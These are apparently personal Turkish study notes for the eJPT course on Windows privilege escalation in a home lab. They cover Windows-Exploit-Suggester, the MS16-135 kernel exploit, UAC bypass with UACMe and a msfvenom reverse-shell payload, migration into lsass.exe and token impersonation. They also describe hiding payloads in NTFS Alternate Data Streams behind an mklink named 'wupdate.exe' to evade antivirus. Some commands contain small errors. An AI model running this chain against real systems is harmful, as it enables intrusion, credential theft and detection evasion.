---
---

## MANUEL PRIV ESC

![[Pasted image 20240205133016.png]]
### Windows-Exploit-Suggester

## Çalışma prensibi şu
### 1. Erişim sağlanmış sistemin bilgilerini txt formatın da kaydediyorsun.
### 2. Bunu attacker makine de #Windows-Exploit-Suggester 'a verdiğinde bu sana zaafiyetleri sıralıyor.

## sysinfo     #sysinfo 
## systeminfo #systeminfo

msf6> shell
C:\Users\kali\Desktop> systeminfo


![[Pasted image 20240205133718.png]]

### Bu alınan çıktıya göre #Windows-Exploit-Suggester karar verecek hangi açıklar olabilir bu hedefte diye

---

## Bunu bodoz kopyaladık ve win-suggester adlı bir txt dosyası içine kaydettik eJPT klasöründe

---
### İlk çalıştırmadan update yapmalısın

![[Pasted image 20240205134231.png]]
##### python2 windows-exploit-suggester.py --update
![[Pasted image 20240205134349.png]]


## Çok Önemli Not
### Win Suggester python2 ile yazılmış derste anlatılanda ama github'a python3 ila yazılmışı var.
https://github.com/Pwnistry/Windows-Exploit-Suggester-python3

##### EJPT içine kaydettim bunu çünkü python2 deki database hatası veriyor ve xlrd kütüphasi hatası
![[Pasted image 20240205135905.png]]
### python3 windows-exploit-suggester.py --update

![[Pasted image 20240205135750.png]]
![[Pasted image 20240205135831.png]]
![[Pasted image 20240205152537.png]]
![[Pasted image 20240205152601.png]]

#### Sonuçlar bu şekilde çıkıyor ve En Üsttekiler muhtemelen exploit şansı en yüksek olanlardır diye öğretmen belirtti.

![[Pasted image 20240205152736.png]]
## [E] ---> exploitdb
## [M] ---> Metasploitable
### [*] ---> missing bullatin kayıp bildiri 

### Bu harfler exploitin hangi kaynakta veya tool da olduğunu anlatır.


---
### İlk Priv Escalete vulnerability'e bakalım

https://www.exploit-db.com/exploits/41015


https://github.com/tinysec/public/tree/master/CVE-2016-7255
### ayrıca açıklamaları  olduğu github respitory DE mevcut
![[Pasted image 20240205153616.png]]
#CVE-2016-7255
#MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important

CVE-2016-7255 
https://github.com/SecWiki
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135
#### MS ,le başlayanlar Microsoft'un kendi verdiği vulnerability Identity

---
##### CVE-2016-7255 = MS16-135

### C dili ile yazılmıştır.
#### Malicious hiç birşey yapmıyor aslında
---
![[Pasted image 20240205154830.png]]
## 41015.exe

![[Pasted image 20240205154933.png]]
## Sadece 64 bitlik işletim sistemlerine karşı kullanılabilir. 

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/41015.exe

## Exploit Safhası
### 1. Yukarıdaki link'den 41015.exe dosyasını indirdik ve eJPT dosyasının içine koyduk. 
### 2. Bunu karşı tarafa göndermemiz ve orada çalıştırmamız lazım

### 3. Bizim zaten meterpretershell'imiz var. 
## meterpreter> upload 41015.exe
### Bu kodla karşıya gönderdik. Göndermede sorun oluştu. Temp klasörüne izin yoktu bir kaç klasör denedikten sonra kendi users klasörüne atabildik .exe dosyasını
## Burada 41015.exe dosyasını direk çalıştırınce işletim sistemi seçmemi söyledi

```
### C:\Users\kali>41015.exe 7 
```
### komutunu çalıştırdığımızda yaklaşık 1 dk sonra nt authority system olarak shellimizi aldık.

---

# Bypassing UAC With UACMe
![[Pasted image 20240205162604.png]]
## UAC (User Account Control)
### Çok Etkili Bir MEthod
#UAC
![[Pasted image 20240205212500.png]]
● User Account Control (UAC) is a Windows security
feature introduced in Windows Vista that is used to
prevent unauthorized changes from being made to the
operating system.
● UAC is used to ensure that changes to the <span style="background:#d4b106">operating</span>
<span style="background:#d4b106">system require approval </span>from the administrator or a user
account that is part of the local administrators group.


##### Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

A non-privileged user attempting to execute a program
with elevated privileges will be prompted with the UAC
credential prompt, whereas a privileged user will be
prompted with a consent prompt.

## Bypassing UAC
#bypass-uac 
#bypass-user-account-control

● In order to successfully bypass UAC, <span style="background:#d4b106">we will need to have access to a user account</span> that is a part of the local administrators group on the Windows target system.

<span style="background:#ff4d4f">● UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.</span>

---
<font color="#ffff00">In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.</font>

![[Pasted image 20240205213607.png]]
### Biz local adminlerden birine erişmiş olmalıyız bu attack vektörünü kullanmak için.

UAC has various integrity levels ranging from low to high, if the <font color="#ffff00">UAC protection level is set below high, Windows programs can be executed with elevated privileges</font> without prompting the user for confirmation.

## Bypassing UAC With UACMe
#UACMe
#uacme 
#windows-user-account-control
#windows-Privilege-Escalation 

##### GitHub: https://github.com/hfiref0x/UACME

● The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from <span style="background:#d4b106">Windows 7 to Windows 10.</span>

● It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges 
#### by abusing the inbuilt <span style="background:#d4b106">Windows AutoElevate</span> tool.

● The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.


---
### Durum şu ki düşük yetkiye sahip olarak bir sisteme erişim sağadığında UAC bu sistemde yüksek yetkiyle bir işlem yapmak istediğinde sana administrator şifresini sorar.

## Attacker olarak bizim bu UAC'yi Bypass yaparak yüksek yetkili işlemleri yapabilmemiz veya yüksek yekti gerektiren pragramları çalıştırabilmemiz lazım.

### Örneğin biz user account password'u değiştirmek istediğimizde UAC'yi bypass yaparak bu password'u değiştirebiliriz.

---
## Exploit
#UAC-exploit
#akagi 
#UAC-akagi


## net users
![[Pasted image 20240205214853.png]]
![[Pasted image 20240205214908.png]]

## net localgroup administrators
![[Pasted image 20240205215910.png]]
![[Pasted image 20240205215957.png]]
```
net localgroup YeniGrup /add
```

### Bu komutla sisteme ekledim kali user'ını. 

---
### Biz bunu bypass etmeye çalışıyoruz 
![[Pasted image 20240205220115.png]]
![[Pasted image 20240205220140.png]]

---
![[Pasted image 20240205220350.png]]
![[Pasted image 20240205220433.png]]

#### Bu level'i bypass etmek oldukça zor
![[Pasted image 20240205220523.png]]


---
---
## Dersin içindeki ilk erişim. Biz kendi win7 'mize msfvenom payload'ı ile eriştik sorun yok

#HFS 
![[Pasted image 20240205221037.png]]
### Port 80 açık ve burada http server çalışıyor.
##### Mozilla ile girip kontrol ettiğimizde #HFS #Http-File-Server çalıştığını görüyoruz.
### HFS 2.3
### rejetto -->> google'layınca rejetto tarafından geliştirildiği çıkıyor.
![[Pasted image 20240205221535.png]]
![[Pasted image 20240205221712.png]]

---

## After First Access - ENUM

## sysinfo
![[Pasted image 20240205222130.png]]

## İlk enum da işletim sistemi - Service PAck ve x86/windows  yani 32 bitlik bir session olduğu çıktı

### x86 demek ben hemen explorer process'e migrate etmem gerekir demek

## pgrep explorer
![[Pasted image 20240205222508.png]]

### Normalde buna ps ile bakıyorduk. Tecrübe işte
![[Pasted image 20240205222558.png]]
### Burada seçiyorduk migrate edeceğimiz process'i

## migrate 1660
![[Pasted image 20240205222657.png]]

## sysinfo
![[Pasted image 20240205222737.png]]
### Şimdi artık x64 64 bitlik bir sessionumuz var ve migrate ettiğimiz için bizi tespit etmeleri daha zor

---

32-bit bir işletim sisteminden 64-bit bir işletim sistemine "migrate" etmek, çeşitli avantajlara sahip olabilir:

1. **Daha Fazla Bellek Kullanımı:**
    
    - 32-bit sistemler, genellikle 4 GB fiziksel bellek sınırlamasına sahiptir. 64-bit sistemler ise çok daha büyük bellek miktarını destekleyebilir (teknik olarak 16 exabytes'a kadar). Bu, daha fazla bellek kullanma ve daha büyük uygulamaları çalıştırma avantajı sağlar.
2. **Performans Artışı:**
    
    - 64-bit işlemciler, genellikle 32-bit işlemcilere kıyasla daha iyi performans sunar. Bu, işlemleri daha hızlı yürütme yeteneği ve daha karmaşık hesaplamalara olanak tanır.
3. **Gelişmiş Güvenlik Özellikleri:**
    
    - 64-bit işletim sistemleri, genellikle daha gelişmiş güvenlik özellikleri sunar. Örneğin, NX (No-eXecute) bit, veri yürütülebilir bellek bölgelerini sınırlamak için kullanılabilir, bu da bazı saldırıları önleyebilir.
4. **64-bit Uygulama Desteği:**
    
    - Bazı uygulamalar, özellikle daha yeni ve güncel yazılımlar, 64-bit sistemlerde daha iyi performans ve daha fazla özellik sunabilir.


**Güvenlik:**

- 32 bitlik işletim sistemleri ve uygulamalar, 64 bitlik işletim sistemlerine ve uygulamalara kıyasla daha fazla güvenlik açıklarına sahiptir. Bu, 32 bitlik bir sistemde çalışırken saldırganların sisteme sızması ve kontrol etmesi daha kolaydır.
- 64 bitlik işletim sistemleri, DEP (Veri Yürütme Engelleme) ve ASLR (Adres Alanı Düzenleme Rastgeleleştirme) gibi gelişmiş güvenlik özelliklerine sahiptir. Bu özellikler, saldırganların kod çalıştırmasını ve sistem üzerinde kontrol sahibi olmasını zorlaştırır.

**Performans:**

- 64 bitlik işletim sistemleri ve uygulamalar, 32 bitlik işletim sistemlerine ve uygulamalara kıyasla daha fazla bellek ve CPU gücüne erişebilir. Bu, daha büyük veri kümeleriyle çalışırken ve daha karmaşık işlemleri gerçekleştirirken daha iyi performans sağlayabilir.

**Uyumluluk:**

- Yeni çıkan birçok uygulama ve donanım 32 bit ile uyumlu değildir. 64 bit bir işletim sistemine geçmek, bu yeni uygulamaları ve donanımları kullanabilmenizi sağlar.

**Diğer:**

- 64 bitlik işletim sistemleri, daha büyük sanal bellek adres alanlarını destekler. Bu, büyük veri kümeleriyle çalışan uygulamalar için önemlidir.
- 64 bitlik işletim sistemleri, daha fazla sayıda CPU çekirdeğine erişebilir. Bu, çoklu çekirdekli işlemcilerden daha fazla yararlanmanızı sağlar.

---

## getuid
![[Pasted image 20240205223219.png]]

## getprivs
![[Pasted image 20240205223305.png]]

## shell

## net user
![[Pasted image 20240205223456.png]]

## net localgroup administrators
![[Pasted image 20240205223626.png]]
### Bu şu demektir. Eğer biz UAC'yi bypass edebilirsek bu kali kullanıcısı kendisinden yüksek yetkilerle code execute edebilir.

## Örnek : 
## net user kali Passwd123
![[Pasted image 20240205223840.png]]
### Buna yetkisi olmadığı için izin vermiyorç UAC'yı bypass edebilirsek verecektir.

---
## Şimdi Sahne UACme 'de
#UACMe 
https://github.com/hfiref0x/UACME.git

### eJPT klasörüne kaydettim UACme'yi

![[Pasted image 20240205224752.png]]
![[Pasted image 20240205224812.png]]
## - Admin account with UAC set on default settings required.
![[Pasted image 20240205225117.png]]


![[Pasted image 20240205224930.png]]
## Methods
![[Pasted image 20240205225212.png]]
### Çok Önemli
## Eğer ben 1. methodu kullanacaksam 
### akagi64.exe    1   {Çalıştırmak istediğim app'in PATH'i/Veya Administrator Privilege ile çalıştırmak istediğim PAYLOAD}
![[Pasted image 20240205225319.png]]

>[!warning] Bu hangi methodu kullanacaksan bunu attack yaptığın makinenin işletim sistemmi ve versiyonu belirler.
![[Pasted image 20240205230121.png]]

---

### Şimdi Bunu Kullanacağız
![[Pasted image 20240205230254.png]]
## Pkgmgr.exe,
Windows işletim sisteminde bulunan bir yürütülebilir dosyadır. "**Paket Yöneticisi**" anlamına gelir ve Windows Installer hizmetinin bir parçasıdır. Pkgmgr.exe, Windows Update aracılığıyla sunulan güncellemeleri ve diğer paketleri yüklemek, kaldırmak ve yönetmek için kullanılır.

### Bu programın özelliklerini kullanmak istiyoruz çünkü bununla .exe dosyaları yukleyebiliriz. Örneğin bizim PAYLOAD'larımız. Bu bizim UAC-Bypass yapmamızı sağlayacak

https://github.com/dotfornet/UACME/blob/master/Compiled/Akagi64.exe
Buradan Compile edilmiş halini indirdik.

![[Pasted image 20240205231717.png]]
#Akagi-exe

---

## Upload Akagi.exe
![[Pasted image 20240205231644.png]]

---
## ŞİMDİ ASlında Bundan Önce 
##### MSFVENOM ile Bir Payload yapacağız. Akagi.exe bizim UAC-bypass yapmamızı sağladığında çalıştırılacak olan Payload bu olacak ve bize NT-Authority olarak istediğimiz komutu çalıştırmamızı payloadımızı çalıştırmamızı sağlayacak.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=5555 -f exe > backdoor.exe
```

![[Pasted image 20240205232259.png]]
##### UACme klasörü içine koydum.

### Tabiki şimdi Bu Payload çalışınca dinleyen ve shell alan birileri lazım. 
![[Pasted image 20240205232530.png]]

---

### Geçen Derste Temp klasörünü bulamamıştık. Şimdi Kendimiz C:\\ klasörü altına kendimiz meterpreter ile yaptık.
![[Pasted image 20240205232755.png]]
```
cd C:\\
mkdir Temp
```

![[Pasted image 20240205232906.png]]
![[Pasted image 20240205233010.png]]
### Biz Akagi.exe ---- backdoor.exe'yi TEMP klasörüne gönderdik.

## shell session'a geçtik
![[Pasted image 20240205233128.png]]
##### Eğer biz şimdi direk backdoor.exe'yi privilege ile çalıştırmak istesek bize UAC izin vermez.
### Şimdi bypass yapmak için 23 numaralı methodu kullanacağız.

![[Pasted image 20240205230254.png]]

### Şimdi Akagi64.exe çalışacak biz de shell alacagız 
### Akagi64.exe 23 C:\Temp\backdoor.exe
### ![[Pasted image 20240205233922.png]]

## Dinleyici'den Shell Aldık AMA hala kullanıcı adımız kali
![[Pasted image 20240205234058.png]]
### Panik yok zaten nt-auth olamıyormusuz AMA YETKİLERİMİZ ROKET Oluyor

## getprivs
### Enum Esnasında buna bakmayı unutma
###### Bunu linux priv esca'daki Find komutu ile yaptıklarımız ve ya sudo -l ile baktıklarımız gibi düşün
![[Pasted image 20240205234222.png]]

---
## Migrate zamanı
![[Pasted image 20240205234408.png]]
## pgrep lsass.exe
![[Pasted image 20240205234454.png]]
##### migrate 460
![[Pasted image 20240205234527.png]]

### Yetkilerimiz arttığı için migrate işleminde NT-AUTHORITY\SYSTEM yetkisi olan lsass.exe'ye migrate ettik ve sonuçç ortada

---
## SeDebugPrivilege Yetkisi
**SeDebugPrivilege** yetkisi sayesinde NT-Authority\System yetkisi olan lsass.exe process'ine migrate etmiş olabilirsiniz.

**SeDebugPrivilege**, bir işlemin başka bir işlemin bellek alanını okumasına ve yazmasına, ayrıca işlem oluşturmasına, askıya almasına veya sonlandırmasına izin veren güçlü bir ayrıcalıktır. Bu ayrıcalık, genellikle hata ayıklayıcılar ve diğer sistem yönetim araçları tarafından kullanılır.

**Lsass.exe** (Local Security Authority Subsystem Service), Windows işletim sisteminde güvenlik politikalarını uygulayan, oturum açma işlemlerini yöneten ve parolaları depolayan kritik bir sistem işlemidir. NT-Authority\System yetkisine sahip olduğu için, lsass.exe sürecine migrate etmek, saldırganlara sisteme tam erişim sağlama potansiyeli verir.

**SeDebugPrivilege** ayrıcalığına sahip bir saldırgan, lsass.exe sürecine inject olabilir ve bu sayede:

- Sistemdeki tüm kullanıcıların parolalarını ve diğer hassas bilgilerini ele geçirebilir.
- Sistemde yeni kullanıcılar oluşturabilir veya mevcut kullanıcıların ayrıcalıklarını yükseltebilir.
- Sistemde kötü amaçlı yazılım çalıştırabilir ve güvenlik kontrollerini atlatabilir.
- Sistemdeki verileri çalabilir veya değiştirebilir.
- Sistemin işleyişini bozabilir veya tamamen çökertebilir.

Bu nedenle, SeDebugPrivilege ayrıcalığının yalnızca güvenilir uygulamalara ve kullanıcılara verilmesi çok önemlidir. Bu ayrıcalığı olabildiğince sınırlandırmak, sistem güvenliğini korumak için önemli bir adımdır.
---

---
### Özet
### 1. Sisteme ilk erişimi sağladık kali user ile
### 2. İlk erişimden sonra Enumeration yaptık ve yetkilerimize ve sysinfomuza baktık.
#### 3. EN KRİTİK net localgroup administrators 'a batık ve bizim de local admin olduğumuzu gördük. Bu yoksa ve UAC bydefault değilse zaten bu attack vektörünü UNUT.Yetkilerimiz çok az olduğu için bunları UAC-bypass yaparak arttırmaya karar verdik.
### 4. msfvenom payload yaptık. msfconsole multi/handler ile dinlemeye başladık.
### 5. Akagi64.exe ve backdoor.exe olan Payload'ımızı karşı tarafta C:\Temp olarak mkdir yaptığımız klasör içine attık
### 6. UACme github'daki sayfasına baktık ve bizim işletim sistemi için en uygun key 23 olduğunu gördük.
### 7. Akagi64.exe 23 C:\Temp\backdoor.exe    ---> bunu çalıştırınca Akagi bize meterpreter shell Aldırdı diğer dinleme yaptığımız multi/handler'dan
## 8. Kullanıcı yine Kali isimliydi ama getprivs roketlemişti.
## 9. **SeDebugPrivilege** bu yetki geldiği için lsass.exe'ye migrate ettik 
### NT Authority System yetkisini kaptık.

---
## KEY/METHOD : 33 Önerilen
![[Pasted image 20240205235931.png]]

---
---
---
## Access Token Impersonation
###### Access Token'ların Taklidini yapmak/Temsil Etmek

![[Pasted image 20240206000156.png]]
#Access-Token-Impersonation


##### Ne zaman windows'u açsan karşına bir login sayfası gelir. Buraya doğru credentials'i girdiğinde bu #winlogon tarafından yönetilir.
### Sen doğru username ve password girdiğinde #winlogon bir tane access token üretir . Bu access token 'ın içinde user kimliği ve sahip olduğu yetki bulunur. 
##### Bu #winlogon un üretiğin access token userinit.exe   process'e attach.lernir. Böylece hangi süreç başlatılırsa başlatılsın bilgisayarda bu access token yetkisiyle başlatılabilir veya başlatılamaz.
## Access Token 'lar kullanıcılara yetki verme veya yetki kısıtlama için üretilir. 


---
### #lsass.exe
### Windows access tokens are <font color="#ffff00">a core element of the authentication</font> process on Windows and are created and managed by the <span style="background:#d4b106">Local Security Authority Subsystem Service (LSASS).</span> 

##### An access token can be thought of as a temporary key akin to a web cookie that <font color="#ffff00">provides users with access to a system or network resource without having to provide credentials each time</font> a process is started or a system resource is accessed.


### #winlogon.exe
##### <font color="#ffff00">Access tokens are generated by the winlogon.exe process</font> every time a user authenticates successfully and <font color="#ffff00">includes the identity and privileges of the user account</font> associated with the thread or process. This token is then attached to the 
### userinit.exe process, 
after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

---

![[Pasted image 20240206112332.png]]

An access token will typically be assigned one of the following security levels:

<span style="background:#d4b106">○</span> <font color="#ffff00">Impersonate-level tokens</font> are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.

<span style="background:#d4b106">○</span> <font color="#ffff00">Delegate-level tokens</font> are typically created through an interactive login on Windows,
primarily through a traditional login or through remote access protocols <span style="background:#d4b106">such as RDP.</span>

<font color="#ffff00">● Impersonate-level tokens </font><font color="#ff0000">can be used to impersonate a token on the local system and not on any external systems that utilize the token.</font>

● <font color="#ffff00">Delegate-level tokens </font><font color="#ff0000">pose the largest threat as they can be used to impersonate tokens on any system.</font>


----
## Windows Privileges

The following are the privileges that are required for a successful impersonation attack:

○ #SeAssignPrimaryToken: This allows a user to impersonate tokens.

○ #SeCreateToken: This allows a user to create an arbitrary token with administrative
privileges.

○ #SeImpersonatePrivilege: This allows a user to <font color="#ffff00">create a process</font> under the security context of another user typically with administrative privileges.

![[Pasted image 20240206121156.png]]

## The Incognito Module

● Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.

● We can use the incognito module to display a list of available tokens that we can impersonate.


### meterpreter shell aldıktan sonra 
## load incognito yazıp bu modulu aldığımız shell'e dahil ediyoruz. aynı load kiwi gibi

![[Pasted image 20240206121344.png]]

---

## Potato Attack Nedir?
https://tryhackme.com/room/localpotato
#### Buradan Çalışabilrisin
#potato-attack
Potato Attack, Windows işletim sistemlerinde SYSTEM hakimiyeti ele geçirmek için kullanılan bir siber saldırı yöntemidir. Bu saldırı, DCOM (Dağıtılmış Bileşen Nesne Modeli) ve RPC (Uzaktan Yordam Çağrısı) mekanizmalarındaki bir güvenlik açığından yararlanır.

**Saldırının İşleyişi:**

1. Saldırgan, hedef bilgisayara özel olarak hazırlanmış bir "patates" dosyası gönderir.
2. Bu dosya, DCOM sunucusu tarafından çalıştırılır ve RPC mekanizması aracılığıyla SYSTEM yetkilerine sahip bir işlem başlatır.
3. Saldırgan, bu işlem üzerinden SYSTEM hakimiyeti ele geçirir ve bilgisayarda istediği işlemleri gerçekleştirebilir.
---
---
## Exploit

### Hedef sisteme erişimi sağladık
![[Pasted image 20240206124722.png]]
##### İlk yapacağımız enum #sysinfo 


### #pgrep explorer
### #migrate 1696

##### Bunu hem tespit edilmemek hem de aldığımız shell x86--> 32bitlik ise böyle yapıyoruz.

---
![[Pasted image 20240206125046.png]]
##### Bizim sistem erişim yetkimiz in verdi ancak ders öğretmenininki izin vermedi

![[Pasted image 20240206130048.png]]

### Başka attack vektörü kullandık yine bizimki izin verdi. Reverse.exe ile LPORT 1234

## Enumeration Devam
![[Pasted image 20240206130134.png]]
### #getprivs
![[Pasted image 20240206130218.png]]
## #SeImpersonatePrivilege 
### Eğer bu yetki varsa biz access token'ları impersonate yapabiliriz anlamına geliyor. 
![[Pasted image 20240206130550.png]]
### Diğer aldığımız shell'de bu yetki var.


---

## Devam ediyoruz.

## #load-incognito

![[Pasted image 20240206130738.png]]
### list_tokens -u

![[Pasted image 20240206130927.png]]
![[Pasted image 20240206130945.png]]

---
### meterpreter > impersonate_token "KALI\kali"
![[Pasted image 20240206134124.png]]
#### Buradaki Delegation Tokens ismini "" arasına yazıyoruz
Delegation Tokens Available
KALI\kali

![[Pasted image 20240206131159.png]]

### Burada getuid çalıştırmaya çalıştık olmadı.

## pgrep explorer
## migrate 1536 yapınca tekrar çalışmaya başladı.

![[Pasted image 20240206133934.png]]

### Yetkiler Arttı ama Hala alt yetkili user'ız

![[Pasted image 20240206134017.png]]

![[Pasted image 20240206134521.png]]
NT Authority\system token'ınını impersote yaparsan getuid NT AUTh olabilriz.

## Metasploitable 3 Windows'te Denedim
![[Pasted image 20240207005526.png]]
### Direk Başarılı oldu




## Burada PATATO ATTACK yapılması gerekiyor

TCM Academy Dersini dinleyelim Privilege Escalete bolumunde

---

---

# Alternate Data Streams
#AlternateData-Streams 
### ● Alternate Data Streams (ADS) is an <span style="background:#d4b106">NTFS (New Technology File System)</span> file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).

---

Alternate Data Streams (ADS), Microsoft'un NTFS dosya sistemine özgü bir özelliktir. <span style="background:#d4b106">Bu özellik, bir dosyanın içine başka veri akışlarını eklemeyi mümkün kılar.</span> Genelde dosya sistemi üzerinde belirli bir dosyanın ana verisi dışında ek bilgiler veya gizli veriler saklamak için kullanılır.
Her dosya, varsayılan bir veri akışına sahiptir. Ancak NTFS, her dosya için bir veya daha fazla alternatif veri akışı eklemeye izin verir. Bu alternatif veri akışları genellikle dosyanın içinde gizli olarak tutulan verileri içerir. Bu, dosyanın boyutunu etkilemeden ek bilgiler eklemek veya gizli veriler saklamak için kullanılabilir.
Ancak, ADS kullanımı bazı güvenlik risklerini de beraberinde getirebilir. Dosyaların içinde gizli veri akışları bulunması, zararlı yazılımların veya kötü niyetli aktivitelerin gizlenmesi için kullanılabilir. Bu nedenle, güvenlik açısından, dosyaların ADS'leri düzenli olarak kontrol edilmesi önemlidir.

---

● Any file created on an NTFS formatted drive will have two different forks/streams:

○ Data stream - Default stream that contains the data of the file.
○ Resource stream - Typically contains the metadata of the file.

<span style="background:#d4b106">● Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection.</span>

● This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.

### ● This technique is usually used to evade basic signature based AVs and static scanning tools.

---
##### Şimdi ne zaman bir text dosyası üretsek veya bir mp3&mp4 dosyası download etsek ,herhangi bir uzantıda ne olursa olsun 2 tane veri akışı data stream olur.

### Default stream -->  txt dosyası var ve içine kaydettiklerim veya daha sonra okuduklarım bu normal default data akışıdır.
## Resource Stream --> Bu da o txt dosyasının meta datasıyla ilgilidir. Bu ürettiğimiz txt file'a attach edilen bir meta data vardır. Bu metadata bu dosya ne zaman üretildi kim üretti. Bununla alakalıdır. 

### MP3-->> Bunu meta data olarak örnek verelim. Müziğin sesini dinlemizi normal default data stream sağlar. Müziğin uzunluğu, muzik dosyasının ne zaman oluşturulduğu, artist, composer gibi diğer veriler meta datadır. 

## ADS'yi tespit edilmekten kurtulmak için hackerlar kullanır.

### Bunu ADS 'yi Alternatif data akışını hacker'lar malicious code'yi normal legitimate yasal dosya içine gizleyerek yaparlar. 

## Kısacası Payload'ı veya malicious kodu metada data ya veya ADS'ye gizleriz bunu yapmak için. Örnek txt file meta datasına resource stream'ine ben payload'u gizlersem ne zaman o txt file çalışırsa benim malicious kodum da çalışır.

#### Bu advanced evasion tekniği değildir. Basic bir tekniktir ve basic signature-based antivirus'lerden ve static scanning tools'lardan kaçmaya yarar. 

---

## Exploit
### Win 7 de -->> Temp klasörüne gidiyoruz.

![[Pasted image 20240206223708.png]]
### Sonra masaüstüne notepad test.txt dosyasını oluşturduk.

![[Pasted image 20240206224044.png]]
### Bu test.txt'nin özellikler bölümündeki details bolumundekiler bizim metadatamızdır ve resource streamdir.

## İşte buraya bir PAYLOAD gizleyebiliriz. Bu dosya açıldığında bizim Payload'ımız execute edilecek.

### del test.txt ile bu dosyayı sildik.


---
## > notepad test.txt:secret.txt 
![[Pasted image 20240206224849.png]]
#ads-exploit
#metadata-exploit
#hidden-secret-file-exploit
#windows-ADS-exploit

##### Şimdi durum şu ki biz normal cmd ile notepad test.txt yazınca ne oluyor biliyoruz. #notepad test.txt:secret.txt yazınca resource stream için hidden biz text kutusu açılıyor. Biz normal test.txt içeriğini veya megabyte'ını kontrol ettiğimiz de herşey 0 byte olarak gözüküyor fakan yine notepad test.txt:secret.txt yazınca kaydettiğimiz veri yine bize gözüküyor. İşte biz Paylod'u buraya gizleyeceğiz.

![[Pasted image 20240206225314.png]]
![[Pasted image 20240206225331.png]]
![[Pasted image 20240206225407.png]]
![[Pasted image 20240206225441.png]]
### Normal test.txt içinde birşey yok ama test.txt:secret.txt içinde kaydettiklerimiz duruyor. 
![[Pasted image 20240206225548.png]]
##### test.txt    ---->> 0 bytes


---
## winPEASx64
#winPEASx64
https://github.com/carlospolop/PEASS-ng/releases/tag/20240204-ab87b191

### eJPT Klasörüne Yukarıdaki Linkten kaydettim. Local Enumeration ve Vulnerability Identify için kullanılır.

### Malicious olmasa da hidden tutulması iyidir. Çünkü bunun sistemine yuklendiğini göre sistem yöneticisi hemen birşeylerin ters gittiğini anlar.

---

## winPEASx64 rename yaptık --> payload olarak.
### Temp directory'e koyduk bunu

![[Pasted image 20240206230845.png]]
![[Pasted image 20240206230951.png]]

## Burası Çok Önemli
#### type komutunu kullanarak payload.exe'nin (winPEASx64.exe'nin) output'unu bir legitimate text file içine bir legitimate secret.txt file içine redirect yapacağız. 
![[Pasted image 20240206231453.png]]

```
type payload.exe > windowslog.txt:winpeas.exe
```

![[Pasted image 20240206231748.png]]
![[Pasted image 20240206231828.png]]


## Attacker bu windowslog.txt içine yasal veriler kaydeder anlaşılmaması için
![[Pasted image 20240206232031.png]]

---
## Bu durumda payload.exe'yi silebiliriz yakalanmamak için cunku zaten windowslog.txt içine biz bunu ekledik. 

---
## >start windowslog.txt:winpeas.exe

![[Pasted image 20240206232453.png]]
### Bunu CMD ile çalıştırmaya çalıştık olmadı-->> Problem değil. #mklink bunu çözer.

### #mklink 
**Windows cdm mklink komutu, yeni bir dosya veya klasör oluşturmak yerine, var olan bir dosya veya klasöre bir bağlantı (sembolik link) oluşturur.**
**Bu bağlantı, orijinal dosya veya klasörün bulunduğu yere bir kısayol gibi davranır ve orijinal dosya veya klasör taşınırsa veya silinirse bağlantı bozulur.**

---

## #mklink 

1. Cmd ile C:\Windows\system23 klasörüne git
```
2. mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```
mklink /J "C:\Temp\windowslog.txt:win.exe" "wupdate.exe"
#### Eğer yetkiniz yok derse CMD'yi yönetici olarak çalıştır.
![[Pasted image 20240206233330.png]]
### Bununla link oluşturuldu.
![[Pasted image 20240206233417.png]]

## wupdate.exe çalıştırıldığında sistem direk winpeas'i çalıştıracak
![[Pasted image 20240206233947.png]]


---
### MSFVENOM - Alternate Data Streams
#msfvenom-Alternate-Data-Streams 
## Şimdi aynısını msfvenom ile üretilmiş bir Payload için deneyeceğiz.

### type payload.exe > windowslog.txt:winpeas.exe 
## Hata yaptığım için aynı isimleri kullandım.

>[!warning] Şimdi bu çok önemli bir not. Biz bu exploit gereği karşı tarafa bir Payload Göderdik bunu da bir txt dosyası içine gizledik. 
>type payload.exe > windowslog.txt:rev.exe
>Bu komutla type payload'ı okudu sonra da windowslog.txt arkasındaki ADS metadata'ya bizim payload.exe 'in içeriğini rev.exe ismiyle gizledi.
>Biz bunu 
>start windows.txt:rev.exe 
>komutuyla çalıştırmak istedik hata verdi. Bunu bypass yapmamız lazım.
>Sybolic link özelliği olan mklink özelliğini kullandık.
>C:\windows\System32 klasörüne gidip burada 
>mklink wupdate.exe C:\Temp\windowslog.txt:rev.exe Buna sembolik bir link oluşturduk.
>VE 1 SAAT BOYUNCA SUREKLİ HATA ALDIK CUNKU WUPDATE.EXE ISIMLI BIR EXE OLMAMASI LAZIM SYSTEM32 KLASORUNDE ZATEN VAROLAN DOSYALAR ICIN MKLINK YAPAMIYOR WINDOWS. MKLINK YAPMAK ICIN ORAYA HERHENGI ISIMDE BIR EXE YAZMAN YETERLI . 
>SONRAKI DENEMEDE MESELE WPDATE.EXE YAZDIM ONU DA KABUL ETTI. AMA BU KLASORDE OLAN WRITE.EXE ZATEN VAROLAN KULLANILAN BIR EXE OLDUGU ICIN SUREKLI HATA VERDI
>ÖZETLE MKLINK DE SYBOLIC LINK YAPACAKSAK EXE ISMINI SALLA.EXE YAP CALISACAK.
>EKRAN FOTOSUNA BAK SIMDI
>![[Pasted image 20240207012552.png]]
>![[Pasted image 20240207012615.png]]
>
### wpdate.exe olarak mklink de ismi salladım yinede çalıştı ve shell'i görüldüğü gibi aldım.


![[Pasted image 20240207011346.png]]

![[Pasted image 20240207011303.png]]

---

# Windows Password Hashes
#Windows-Password-Hashes

